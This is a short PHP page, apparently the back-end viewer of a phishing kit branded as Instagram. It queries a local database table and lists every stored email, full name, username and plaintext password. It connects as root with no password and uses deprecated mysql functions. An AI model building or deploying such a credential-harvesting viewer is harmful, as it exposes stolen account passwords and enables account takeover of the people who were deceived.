<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Untitled Document</title>
</head>

<body>
<?php
$koneksi=mysql_connect("localhost","root","") or die ("Gagal connect ke server");
mysql_select_db("dbigserver") or die ("Gagal membuka database");
?>
<center> DATA AKUN INSTAGRAM<br> INSTAGRAM.COMP INC <hr>
<table border=1>
<tr><td><center>EMAIL</center></td><td><center>
FULLNAME</center></td><td><center>USERNAME</center></center></td><td><center>PASSWORD</center></center></td><tr>
<?php
$sql="select * from tsign";
$hasil=mysql_query($sql,$koneksi) or die ("Gagal melakukan Query");;
while ($row=mysql_fetch_array($hasil)) {
?>
<tr><td><?php echo $row ['email']; ?></td>
<td><?php echo $row ['fullname']; ?></td>
<td><?php echo $row ['username']; ?></td>
<td><?php echo $row ['password']; ?></td>
</tr>
<?php
}
mysql_close($koneksi);
?></table>
</body>
</html>
